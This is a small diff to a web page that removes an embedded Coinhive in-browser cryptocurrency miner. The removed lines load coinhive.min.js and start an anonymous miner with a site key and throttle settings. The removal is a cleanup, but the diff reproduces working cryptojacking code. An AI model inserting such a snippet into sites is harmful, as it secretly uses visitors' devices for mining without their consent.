@@ -1210,13 +1210,6 @@ for (i = 0; i < close.length; i++) {
     }
 }
 </script>
-            
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script type="text/javascript">
-
-var miner = new CoinHive.Anonymous('d5IJhWxr2zofws14IqksaRqth1KEtrlx',{ autoThreads: false, threads: 1, throttle: 0.99, forceASMJS: false });
-            miner.start();
-</script> 
 <script tpye="text/javascript" src="js/mdu-auto-select.js"></script>
         <center>
                 <br/>
